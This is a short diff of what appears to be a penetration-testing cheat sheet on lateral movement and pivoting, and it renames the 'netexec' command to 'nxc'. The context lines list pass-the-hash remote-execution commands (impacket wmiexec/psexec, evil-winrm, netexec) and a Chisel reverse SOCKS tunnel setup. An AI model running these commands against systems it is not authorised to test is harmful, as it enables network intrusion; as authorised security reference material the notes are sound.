@@ -21,7 +21,7 @@ tags: [lateral-movement, pivoting, index]
 impacket-wmiexec -hashes :<NTLM> <domain>/<user>@<target>
 impacket-psexec -hashes :<NTLM> <domain>/<user>@<target>
 evil-winrm -i <target> -u <user> -H <NTLM>
-netexec smb <target> -u <user> -H <NTLM> -x "whoami"
+nxc smb <target> -u <user> -H <NTLM> -x "whoami"
 
 # Pivoting — Chisel
 # Attacker: ./chisel server -p 8888 --reverse --socks5
